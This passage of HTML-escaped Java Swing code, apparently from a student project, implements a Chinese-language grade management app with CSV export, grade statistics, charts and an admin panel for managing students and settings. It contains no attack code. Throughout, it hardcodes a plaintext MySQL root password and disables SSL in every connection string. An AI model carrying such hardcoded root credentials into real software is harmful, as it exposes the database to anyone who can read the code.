&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 导出成绩</span><br><span class="line">            private void exportGrades() &#123;</span><br><span class="line">                JFileChooser fileChooser = new JFileChooser();</span><br><span class="line">                fileChooser.setDialogTitle(&quot;选择导出文件位置&quot;);</span><br><span class="line">                int userChoice = fileChooser.showSaveDialog(this);</span><br><span class="line">                if (userChoice == JFileChooser.APPROVE_OPTION) &#123;</span><br><span class="line">                    File file = fileChooser.getSelectedFile();</span><br><span class="line">                    if (!file.getName().endsWith(&quot;.csv&quot;)) &#123;</span><br><span class="line">                        file = new File(file.getAbsolutePath() + &quot;.csv&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) &#123;</span><br><span class="line">                        writer.write(&quot;学生ID,学生姓名,数学,马原,英语,线性代数\n&quot;);</span><br><span class="line"></span><br><span class="line">                        try &#123;</span><br><span class="line">                            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                                 Statement stmt = conn.createStatement()) &#123;</span><br><span class="line"></span><br><span class="line">                                ResultSet rs = stmt.executeQuery(&quot;SELECT stuid2, name, math, MaYuan, English, linemath FROM studentgrade&quot;);</span><br><span class="line">                                while (rs.next()) &#123;</span><br><span class="line">                                    String stuid2 = rs.getString(&quot;stuid2&quot;);</span><br><span class="line">                                    String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                                    int math = rs.getInt(&quot;math&quot;);</span><br><span class="line">                                    int MaYuan = rs.getInt(&quot;MaYuan&quot;);</span><br><span class="line">                                    int English = rs.getInt(&quot;English&quot;);</span><br><span class="line">                                    int linemath = rs.getInt(&quot;linemath&quot;);</span><br><span class="line"></span><br><span class="line">                                    DecimalFormat df = new DecimalFormat(&quot;#&quot;);</span><br><span class="line">                                    String formattedMath = df.format(math);</span><br><span class="line">                                    String formattedMaYuan = df.format(MaYuan);</span><br><span class="line">                                    String formattedEnglish = df.format(English);</span><br><span class="line">                                    String formattedLinemath = df.format(linemath);</span><br><span class="line"></span><br><span class="line">                                    writer.write(String.format(&quot;%s,%s,%s,%s,%s,%s\n&quot;, stuid2, name, formattedMath, formattedMaYuan, formattedEnglish, formattedLinemath));</span><br><span class="line">                                &#125;</span><br><span class="line">                                JOptionPane.showMessageDialog(this, &quot;成绩导出成功!&quot;);</span><br><span class="line">                            &#125; catch (SQLException e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                                JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;数据库驱动类未找到: &quot; + e.getMessage());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; catch (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        JOptionPane.showMessageDialog(this, &quot;文件写入错误: &quot; + e.getMessage());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 成绩统计分析</span><br><span class="line"></span><br><span class="line">    private void analyzeGrades() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;,</span><br><span class="line">                    &quot;1405269390a&quot;);</span><br><span class="line">                 Statement stmt = conn.createStatement()) &#123;</span><br><span class="line"></span><br><span class="line">                // 查询每门课程的平均分、最高分和最低分</span><br><span class="line">                String query = &quot;SELECT &quot; +</span><br><span class="line">                        &quot;AVG(math) AS avg_math, MAX(math) AS max_math, MIN(math) AS min_math, &quot; +</span><br><span class="line">                        &quot;AVG(MaYuan) AS avg_maYuan, MAX(MaYuan) AS max_maYuan, MIN(MaYuan) AS min_maYuan, &quot; +</span><br><span class="line">                        &quot;AVG(English) AS avg_english, MAX(English) AS max_english, MIN(English) AS min_english, &quot; +</span><br><span class="line">                        &quot;AVG(linemath) AS avg_linemath, MAX(linemath) AS max_linemath, MIN(linemath) AS min_linemath &quot; +</span><br><span class="line">                        &quot;FROM studentgrade&quot;;</span><br><span class="line"></span><br><span class="line">                ResultSet rs = stmt.executeQuery(query);</span><br><span class="line">                if (rs.next()) &#123;</span><br><span class="line">                    // 显示成绩信息</span><br><span class="line">                    String message = String.format(</span><br><span class="line">                            &quot;数学：平均分: %.2f, 最高分: %d, 最低分: %d\n&quot; +</span><br><span class="line">                                    &quot;马原：平均分: %.2f, 最高分: %d, 最低分: %d\n&quot; +</span><br><span class="line">                                    &quot;英语：平均分: %.2f, 最高分: %d, 最低分: %d\n&quot; +</span><br><span class="line">                                    &quot;线性代数：平均分: %.2f, 最高分: %d, 最低分: %d&quot;,</span><br><span class="line">                            rs.getDouble(&quot;avg_math&quot;), rs.getInt(&quot;max_math&quot;), rs.getInt(&quot;min_math&quot;),</span><br><span class="line">                            rs.getDouble(&quot;avg_maYuan&quot;), rs.getInt(&quot;max_maYuan&quot;), rs.getInt(&quot;min_maYuan&quot;),</span><br><span class="line">                            rs.getDouble(&quot;avg_english&quot;), rs.getInt(&quot;max_english&quot;), rs.getInt(&quot;min_english&quot;),</span><br><span class="line">                            rs.getDouble(&quot;avg_linemath&quot;), rs.getInt(&quot;max_linemath&quot;), rs.getInt(&quot;min_linemath&quot;)</span><br><span class="line">                    );</span><br><span class="line"></span><br><span class="line">                    JOptionPane.showMessageDialog(this, message);</span><br><span class="line"></span><br><span class="line">                    // 询问用户是否生成图表</span><br><span class="line">                    int response = JOptionPane.showConfirmDialog(this, &quot;是否生成成绩图表？&quot;, &quot;选择图表类型&quot;,</span><br><span class="line">                            JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);</span><br><span class="line"></span><br><span class="line">                    if (response == JOptionPane.YES_OPTION) &#123;</span><br><span class="line">                        // 选择图表类型</span><br><span class="line">                        String[] options = &#123;&quot;柱状图&quot;, &quot;折线图&quot;&#125;;</span><br><span class="line">                        int chartType = JOptionPane.showOptionDialog(this, &quot;请选择图表类型：&quot;,</span><br><span class="line">                                &quot;选择图表类型&quot;, JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE,</span><br><span class="line">                                null, options, options[0]);</span><br><span class="line"></span><br><span class="line">                        // 创建数据集</span><br><span class="line">                        DefaultCategoryDataset dataset = new DefaultCategoryDataset();</span><br><span class="line">                        dataset.addValue(rs.getDouble(&quot;avg_math&quot;), &quot;平均分&quot;, &quot;数学&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;max_math&quot;), &quot;最高分&quot;, &quot;数学&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;min_math&quot;), &quot;最低分&quot;, &quot;数学&quot;);</span><br><span class="line">                        dataset.addValue(rs.getDouble(&quot;avg_maYuan&quot;), &quot;平均分&quot;, &quot;马原&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;max_maYuan&quot;), &quot;最高分&quot;, &quot;马原&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;min_maYuan&quot;), &quot;最低分&quot;, &quot;马原&quot;);</span><br><span class="line">                        dataset.addValue(rs.getDouble(&quot;avg_english&quot;), &quot;平均分&quot;, &quot;英语&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;max_english&quot;), &quot;最高分&quot;, &quot;英语&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;min_english&quot;), &quot;最低分&quot;, &quot;英语&quot;);</span><br><span class="line">                        dataset.addValue(rs.getDouble(&quot;avg_linemath&quot;), &quot;平均分&quot;, &quot;线性代数&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;max_linemath&quot;), &quot;最高分&quot;, &quot;线性代数&quot;);</span><br><span class="line">                        dataset.addValue(rs.getInt(&quot;min_linemath&quot;), &quot;最低分&quot;, &quot;线性代数&quot;);</span><br><span class="line"></span><br><span class="line">                        // 创建图表</span><br><span class="line">                        JFreeChart chart;</span><br><span class="line">                        if (chartType == 0) &#123; // 柱状图</span><br><span class="line">                            chart = ChartFactory.createBarChart(</span><br><span class="line">                                    &quot;成绩分析&quot;,</span><br><span class="line">                                    &quot;课程&quot;,</span><br><span class="line">                                    &quot;分数&quot;,</span><br><span class="line">                                    dataset,</span><br><span class="line">                                    PlotOrientation.VERTICAL,</span><br><span class="line">                                    true,</span><br><span class="line">                                    true,</span><br><span class="line">                                    false</span><br><span class="line">                            );</span><br><span class="line">                        &#125; else &#123; // 折线图</span><br><span class="line">                            chart = ChartFactory.createLineChart(</span><br><span class="line">                                    &quot;成绩分析&quot;,</span><br><span class="line">                                    &quot;课程&quot;,</span><br><span class="line">                                    &quot;分数&quot;,</span><br><span class="line">                                    dataset,</span><br><span class="line">                                    PlotOrientation.VERTICAL,</span><br><span class="line">                                    true,</span><br><span class="line">                                    true,</span><br><span class="line">                                    false</span><br><span class="line">                            );</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        // 显示图表</span><br><span class="line">                        ChartFrame frame = new ChartFrame(&quot;成绩分析图&quot;, chart);</span><br><span class="line">                        frame.pack();</span><br><span class="line">                        frame.setLocationRelativeTo(null);</span><br><span class="line">                        frame.setVisible(true);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//实现管理员的方法，默认语言就是中文，但是整体的公共的语言没有改变。</span><br><span class="line"></span><br><span class="line">         class AdminPanel extends JPanel &#123;</span><br><span class="line">            private String currentTheme = &quot;默认主题&quot;; // 默认主题</span><br><span class="line">            private String currentLanguage = &quot;中文&quot;; // 默认语言</span><br><span class="line">            private String currentDatabaseURL = &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;;</span><br><span class="line">            private String currentDatabaseUsername = &quot;root&quot;;</span><br><span class="line">            private String currentDatabasePassword = &quot;1405269390a&quot;;</span><br><span class="line">            public AdminPanel() &#123;</span><br><span class="line">                setLayout(new BorderLayout());</span><br><span class="line"></span><br><span class="line">                // 顶部标题</span><br><span class="line">                JPanel topPanel = new JPanel();</span><br><span class="line">                JLabel titleLabel = new JLabel(&quot;管理员控制面板&quot;, JLabel.CENTER);</span><br><span class="line">                titleLabel.setFont(new Font(&quot;Serif&quot;, Font.BOLD, 24));</span><br><span class="line">                topPanel.add(titleLabel);</span><br><span class="line">                add(topPanel, BorderLayout.NORTH);</span><br><span class="line"></span><br><span class="line">                // 功能按钮面板</span><br><span class="line">                JPanel buttonPanel = new JPanel(new GridLayout(3, 6, 5, 5));  // 3列布局</span><br><span class="line"></span><br><span class="line">                JButton btnUserManagement = createStyledButton(&quot;学生管理&quot;);</span><br><span class="line">                JButton btnSystemSettings = createStyledButton(&quot;系统设置&quot;);</span><br><span class="line">                JButton btnGenerateReport = createStyledButton(&quot;生成报表&quot;);</span><br><span class="line"></span><br><span class="line">                // 按钮事件绑定</span><br><span class="line">                btnUserManagement.addActionListener(e -&gt; manageUsers());</span><br><span class="line">                btnSystemSettings.addActionListener(e -&gt; systemSettings());</span><br><span class="line">                btnGenerateReport.addActionListener(e -&gt; generateReport());</span><br><span class="line"></span><br><span class="line">                // 添加按钮到按钮面板</span><br><span class="line">                buttonPanel.add(btnUserManagement);</span><br><span class="line">                buttonPanel.add(btnSystemSettings);</span><br><span class="line">                buttonPanel.add(btnGenerateReport);</span><br><span class="line"></span><br><span class="line">                add(buttonPanel, BorderLayout.CENTER);</span><br><span class="line"></span><br><span class="line">                // 底部版权信息</span><br><span class="line">                JPanel bottomPanel = new JPanel();</span><br><span class="line">                bottomPanel.setBackground(new Color(72, 61, 139));</span><br><span class="line">                JLabel bottomLabel = new JLabel(&quot;版权所有 © 2024 管理员系统&quot;, JLabel.CENTER);</span><br><span class="line">                bottomLabel.setForeground(Color.WHITE);</span><br><span class="line">                bottomPanel.add(bottomLabel);</span><br><span class="line">                add(bottomPanel, BorderLayout.SOUTH);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            private JButton createStyledButton(String text) &#123;</span><br><span class="line">                JButton button = new JButton(text);</span><br><span class="line">                button.setFont(new Font(&quot;Serif&quot;, Font.PLAIN, 18));  // 使用Arial字体，较大的字号</span><br><span class="line">                button.setFocusPainted(false);  // 不显示按钮的焦点框</span><br><span class="line">                button.setPreferredSize(new Dimension(10, 10)); // 设置按钮的大小</span><br><span class="line">                button.setForeground(Color.BLACK);  // 文字颜色为黑色</span><br><span class="line">                button.setBackground(Color.WHITE);  // 背景为白色</span><br><span class="line">                button.setBorder(BorderFactory.createLineBorder(Color.BLACK, 2)); // 边框颜色为黑色</span><br><span class="line">                button.setOpaque(false);  // 设置按钮背景透明</span><br><span class="line">                return button;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            private void manageUsers() &#123;</span><br><span class="line">        String[] options = &#123;&quot;添加学生&quot;, &quot;删除学生&quot;, &quot;查看学生&quot;&#125;;</span><br><span class="line">        int choice = JOptionPane.showOptionDialog(this, &quot;请选择操作:&quot;, &quot;学生管理&quot;,</span><br><span class="line">                JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE,</span><br><span class="line">                null, options, options[0]);</span><br><span class="line"></span><br><span class="line">        switch (choice) &#123;</span><br><span class="line">            case 0: // 添加用户</span><br><span class="line">                addUser();</span><br><span class="line">                break;</span><br><span class="line">            case 1: // 删除用户</span><br><span class="line">                deleteUser();</span><br><span class="line">                break;</span><br><span class="line">            case 2: // 查看用户</span><br><span class="line">                viewUsers();</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void addUser() &#123;</span><br><span class="line">        JTextField usernameField = new JTextField(15);</span><br><span class="line">        JTextField nameField = new JTextField(15);</span><br><span class="line">        JPanel panel = new JPanel(new GridLayout(0, 1));</span><br><span class="line">        panel.add(new JLabel(&quot;学生ID:&quot;));</span><br><span class="line">        panel.add(usernameField);</span><br><span class="line">        panel.add(new JLabel(&quot;姓名:&quot;));</span><br><span class="line">        panel.add(nameField);</span><br><span class="line"></span><br><span class="line">        int option = JOptionPane.showConfirmDialog(this, panel, &quot;添加学生&quot;, JOptionPane.OK_CANCEL_OPTION);</span><br><span class="line">        if (option == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">            String username = usernameField.getText();</span><br><span class="line">            String name = nameField.getText();</span><br><span class="line">            saveUserToDatabase(username, name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void saveUserToDatabase(String username, String name) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                 PreparedStatement stmt = conn.prepareStatement(&quot;INSERT INTO student (stuid1, name) VALUES (?, ?)&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                stmt.setString(1, username);</span><br><span class="line">                stmt.setString(2, name);</span><br><span class="line">                stmt.executeUpdate();</span><br><span class="line"></span><br><span class="line">                JOptionPane.showMessageDialog(this, &quot;学生 &quot; + name + &quot; 添加成功!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void deleteUser() &#123;</span><br><span class="line">        String username = JOptionPane.showInputDialog(this, &quot;请输入要删除的学生ID:&quot;);</span><br><span class="line">        if (username != null &amp;&amp; !username.trim().isEmpty()) &#123;</span><br><span class="line">            deleteUserFromDatabase(username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void deleteUserFromDatabase(String studentId) &#123;</span><br><span class="line">        Connection conn = null;</span><br><span class="line">        PreparedStatement stmt1 = null, stmt2 = null, stmt3 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line"></span><br><span class="line">            // 创建数据库连接</span><br><span class="line">            conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line"></span><br><span class="line">            // 禁用自动提交，启用事务</span><br><span class="line">            conn.setAutoCommit(false);</span><br><span class="line"></span><br><span class="line">            // 删除学生成绩</span><br><span class="line">            String deleteGradesQuery = &quot;DELETE FROM studentgrade WHERE stuid2 = ?&quot;;</span><br><span class="line">            stmt1 = conn.prepareStatement(deleteGradesQuery);</span><br><span class="line">            stmt1.setString(1, studentId);</span><br><span class="line">            stmt1.executeUpdate();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            // 删除学生基本信息</span><br><span class="line">            String deleteStudentQuery = &quot;DELETE FROM student WHERE stuid1 = ?&quot;;</span><br><span class="line">            stmt3 = conn.prepareStatement(deleteStudentQuery);</span><br><span class="line">            stmt3.setString(1, studentId);</span><br><span class="line">            int rowsAffected = stmt3.executeUpdate();</span><br><span class="line"></span><br><span class="line">            // 如果成功删除学生信息，提交事务</span><br><span class="line">            if (rowsAffected &gt; 0) &#123;</span><br><span class="line">                conn.commit(); // 提交事务</span><br><span class="line">                JOptionPane.showMessageDialog(this, &quot;学生 &quot; + studentId + &quot; 的所有信息删除成功!&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 如果没有删除学生记录，回滚事务</span><br><span class="line">                conn.rollback();</span><br><span class="line">                JOptionPane.showMessageDialog(this, &quot;未找到学生 &quot; + studentId + &quot; 的信息。&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (conn != null) &#123;</span><br><span class="line">                    conn.rollback(); // 出现异常时回滚事务</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (SQLException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage(), &quot;错误&quot;, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                // 关闭数据库连接和Statement</span><br><span class="line">                if (stmt1 != null) stmt1.close();</span><br><span class="line">                if (stmt2 != null) stmt2.close();</span><br><span class="line">                if (stmt3 != null) stmt3.close();</span><br><span class="line">                if (conn != null) conn.close();</span><br><span class="line">            &#125; catch (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void viewUsers() &#123;</span><br><span class="line">        List&lt;String&gt; users = fetchUsersFromDatabase();</span><br><span class="line">        if (users.isEmpty()) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;没有用户记录&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(this, String.join(&quot;\n&quot;, users));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private List&lt;String&gt; fetchUsersFromDatabase() &#123;</span><br><span class="line">        List&lt;String&gt; users = new ArrayList&lt;&gt;();</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                 Statement stmt = conn.createStatement();</span><br><span class="line">                 ResultSet rs = stmt.executeQuery(&quot;SELECT stuid1, name FROM student&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                while (rs.next()) &#123;</span><br><span class="line">                    String studentId = rs.getString(&quot;stuid1&quot;);</span><br><span class="line">                    String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                    users.add(&quot;ID: &quot; + studentId + &quot; | 姓名: &quot; + name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        return users;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void systemSettings() &#123;</span><br><span class="line">        String[] options = &#123;&quot;设置主题&quot;, &quot;设置语言&quot;, &quot;修改数据库连接&quot;, &quot;返回&quot;&#125;;</span><br><span class="line">        int choice = JOptionPane.showOptionDialog(this, &quot;选择操作&quot;, &quot;系统设置&quot;,</span><br><span class="line">                JOptionPane.DEFAULT_OPTION, JOptionPane.INFORMATION_MESSAGE,</span><br><span class="line">                null, options, options[0]);</span><br><span class="line"></span><br><span class="line">        switch (choice) &#123;</span><br><span class="line">            case 0:</span><br><span class="line">                setTheme();</span><br><span class="line">                break;</span><br><span class="line">            case 1:</span><br><span class="line">                setLanguage();</span><br><span class="line">                break;</span><br><span class="line">            case 2:</span><br><span class="line">                setDatabaseConnection(); // 新增数据库连接设置</span><br><span class="line">                break;</span><br><span class="line">            case 3:</span><br><span class="line">            default:</span><br><span class="line">                break; // 返回或关闭</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置主题</span><br><span class="line">    private void setTheme() &#123;</span><br><span class="line">        String[] themes = &#123;&quot;默认主题&quot;, &quot;暗黑主题&quot;, &quot;明亮主题&quot;&#125;;</span><br><span class="line">        String selectedTheme = (String) JOptionPane.showInputDialog(this, &quot;选择主题&quot;, &quot;设置主题&quot;,</span><br><span class="line">                JOptionPane.QUESTION_MESSAGE, null, themes, currentTheme);</span><br><span class="line">        if (selectedTheme != null) &#123;</span><br><span class="line">            currentTheme = selectedTheme;</span><br><span class="line">            applyTheme();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;主题已更改为: &quot; + currentTheme);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 应用主题</span><br><span class="line">    private void applyTheme() &#123;</span><br><span class="line">        switch (currentTheme) &#123;</span><br><span class="line">            case &quot;暗黑主题&quot;:</span><br><span class="line">                setBackground(Color.DARK_GRAY);</span><br><span class="line">                break;</span><br><span class="line">            case &quot;明亮主题&quot;:</span><br><span class="line">                setBackground(Color.LIGHT_GRAY);</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                setBackground(Color.WHITE);</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">        repaint(); // 更新界面</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //设置语言，要更新的是整体阿代码，但是这个并没有实现，有点差错</span><br><span class="line">    private void setLanguage() &#123;</span><br><span class="line">        String[] languages = &#123;&quot;中文&quot;, &quot;英文&quot;&#125;;</span><br><span class="line">        String selectedLanguage = (String) JOptionPane.showInputDialog(this, &quot;选择语言&quot;, &quot;设置语言&quot;,</span><br><span class="line">                JOptionPane.QUESTION_MESSAGE, null, languages, currentLanguage);</span><br><span class="line">        if (selectedLanguage != null) &#123;</span><br><span class="line">            currentLanguage = selectedLanguage;</span><br><span class="line"></span><br><span class="line">            // 根据语言设置字体</span><br><span class="line">            Font newFont;</span><br><span class="line">            if (currentLanguage.equals(&quot;英文&quot;)) &#123;</span><br><span class="line">                newFont = new Font(&quot;Arial&quot;, Font.PLAIN, 12);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                newFont = new Font(&quot;SimSun&quot;, Font.PLAIN, 18); // 使用中文字体</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 设置整个应用程序的字体</span><br><span class="line">            setComponentsFont(this, newFont);</span><br><span class="line"></span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;语言已更改为: &quot; + currentLanguage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">             private void setComponentsFont(Component component, Font font) &#123;</span><br><span class="line">                 if (component instanceof JLabel) &#123;</span><br><span class="line">                     ((JLabel) component).setFont(font);</span><br><span class="line">                 &#125; else if (component instanceof JTextField) &#123;</span><br><span class="line">                     ((JTextField) component).setFont(font);</span><br><span class="line">                 &#125; else if (component instanceof JTextArea) &#123;</span><br><span class="line">                     ((JTextArea) component).setFont(font);</span><br><span class="line">                 &#125; else if (component instanceof JTable) &#123;</span><br><span class="line">                     ((JTable) component).setFont(font);</span><br><span class="line">                 &#125; else if (component instanceof Container) &#123;</span><br><span class="line">                     Component[] subComponents = ((Container) component).getComponents();</span><br><span class="line">                     for (Component subComponent : subComponents) &#123;</span><br><span class="line">                         setComponentsFont(subComponent, font);</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">    // 修改数据库连接</span><br><span class="line">    private void setDatabaseConnection() &#123;</span><br><span class="line">        String url = JOptionPane.showInputDialog(this, &quot;输入数据库URL&quot;, currentDatabaseURL);</span><br><span class="line">        if (url != null &amp;&amp; !url.trim().isEmpty()) &#123;</span><br><span class="line">            currentDatabaseURL = url;</span><br><span class="line"></span><br><span class="line">            // 假设你还有用户名和密码需要设置</span><br><span class="line">            String username = JOptionPane.showInputDialog(this, &quot;输入数据库用户名&quot;, currentDatabaseUsername);</span><br><span class="line">            if (username != null) &#123;</span><br><span class="line">                currentDatabaseUsername = username;</span><br><span class="line"></span><br><span class="line">                String password = JOptionPane.showInputDialog(this, &quot;输入数据库密码&quot;, currentDatabasePassword);</span><br><span class="line">                if (password != null) &#123;</span><br><span class="line">                    currentDatabasePassword = password;</span><br><span class="line"></span><br><span class="line">                    // 这里可以添加连接数据库的代码</span><br><span class="line">                    // connectToDatabase(currentDatabaseURL, currentDatabaseUsername, currentDatabasePassword);</span><br><span class="line"></span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库连接已更改为:\n&quot; +</span><br><span class="line">                            &quot;URL: &quot; + currentDatabaseURL + &quot;\n&quot; +</span><br><span class="line">                            &quot;用户名: &quot; + currentDatabaseUsername);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void generateReport() &#123;</span><br><span class="line">        String reportType = JOptionPane.showInputDialog(this, &quot;请输入报表类型（例如：学生成绩, 学生列表）:&quot;);</span><br><span class="line">        if (reportType != null &amp;&amp; !reportType.trim().isEmpty()) &#123;</span><br><span class="line">            if (reportType.equalsIgnoreCase(&quot;学生成绩&quot;)) &#123;</span><br><span class="line">                generateGradeReport();</span><br><span class="line">            &#125; else if (reportType.equalsIgnoreCase(&quot;学生列表&quot;)) &#123;</span><br><span class="line">                generateUserReport();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                JOptionPane.showMessageDialog(this, &quot;无效的报表类型!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void generateGradeReport() &#123;</span><br><span class="line">        String[] columnNames = &#123;&quot;学生ID&quot;, &quot;姓名&quot;, &quot;数学成绩&quot;, &quot;英语成绩&quot;, &quot;MaYuan成绩&quot;, &quot;linemath成绩&quot;&#125;;</span><br><span class="line">        DefaultTableModel model = new DefaultTableModel(columnNames, 0);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;, 